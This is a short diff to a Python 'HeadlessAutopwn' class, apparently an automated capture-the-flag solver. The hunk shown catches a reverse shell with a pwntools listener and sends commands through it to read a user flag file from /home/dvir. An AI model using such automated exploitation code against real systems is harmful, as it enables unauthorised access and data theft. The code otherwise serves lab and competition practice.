@@ -97,17 +97,15 @@ class HeadlessAutopwn:
 
         with listen(self.lport) as shell:
             if shell.wait_for_connection():
-                # User Flag
                 log.success('Successful shell connection!')
 
-                self._dump_shell_lines(shell, 2)
-
+                # User Flag
                 log.info('Seeking user flag...')
 
                 shell.sendline(b'cd /home/dvir')
                 shell.sendline(b'cat user.txt')
 
-                self._dump_shell_lines(shell, 2)
+                self._dump_shell_lines(shell, 4)
 
                 user_flag = str(shell.recvline(), 'utf-8').replace('\n', '')
                 
